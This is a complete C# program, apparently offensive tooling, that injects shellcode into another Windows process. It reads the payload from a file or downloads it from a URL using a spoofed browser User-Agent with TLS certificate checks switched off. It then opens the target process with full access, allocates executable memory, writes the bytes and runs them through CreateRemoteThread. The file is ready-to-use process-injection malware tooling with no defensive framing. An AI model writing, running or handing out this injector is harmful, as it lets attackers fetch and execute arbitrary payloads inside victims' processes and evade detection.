using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;

namespace Inject
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: Inject <PID> <FilePath or URL>");
                return;
            }

            // 解析 PID
            int pid;
            if (!int.TryParse(args[0], out pid))
            {
                Console.WriteLine("Invalid PID.");
                return;
            }

            string source = args[1];
            byte[] buf;

            if (source.StartsWith("http://") || source.StartsWith("https://"))
            {
                try
                {
                    buf = DownloadData(source);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error downloading file: {ex.Message}");
                    return;
                }
            }
            else
            {
                try
                {
                    buf = File.ReadAllBytes(source);
                }
                catch (IOException ex)
                {
                    Console.WriteLine($"Error reading file: {ex.Message}");
                    return;
                }
            }

            // 打開進程
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open process.");
                return;
            }

            // 在遠端進程中分配記憶體
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Memory allocation failed.");
                return;
            }

            // 寫入記憶體
            IntPtr outSize;
            if (!WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize))
            {
                Console.WriteLine("Failed to write memory.");
                return;
            }

            // 創建遠端線程執行載入的代碼
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create remote thread.");
                return;
            }

            Console.WriteLine("Injected successfully.");
        }

        private static byte[] DownloadData(string url)
        {
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                return wc.DownloadData(url);
            }
        }
    }
}

